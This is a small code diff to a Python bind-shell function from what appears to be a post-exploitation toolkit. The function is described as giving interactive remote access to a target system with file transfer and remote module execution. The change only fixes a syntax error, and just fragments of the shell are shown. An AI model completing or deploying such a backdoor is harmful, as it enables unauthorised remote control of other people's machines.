@@ -1,4 +1,3 @@
-
 def bshell():
     '''
     @description: Starts a TCP bind shell on the target system. Interactive shell with download/upload, cd and ability to execute other modules remotely."
@@ -75,7 +74,7 @@ def bshell():
             conn.send(str(modList))
             conn.send("\nIntersect "+str(os.getcwd())+" => ")
 
-        elif cmd.startswith(":exec")
+        elif cmd.startswith(":exec"):
             pass
 
         elif cmd == (':killme'):
